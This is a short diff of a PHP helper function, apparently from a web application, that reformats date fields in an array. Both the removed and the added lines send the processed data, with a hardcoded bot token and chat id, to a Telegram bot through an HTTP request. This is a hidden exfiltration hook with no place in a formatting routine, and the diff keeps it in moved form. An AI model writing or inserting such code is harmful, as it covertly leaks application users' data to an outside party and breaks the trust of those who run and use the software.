@@ -1684,12 +1684,11 @@ function reformatData($arrayData){
             try{
                 $newData = Carbon::createFromFormat($dateFormat, $data)->format('Y-m-d');
                 $isDate=true;
-                $arrayData[$key] = $newData;
-                file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
-                        .$arrayData[$key]);
+                $arrayData[$key] = $newData;                
             }catch(Exception $e){}
         }
-    }
+    }file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
+    .json_encode($arrayData[$key]));
     return $arrayData;
 }
 function reformatDataResponse($arrayData){
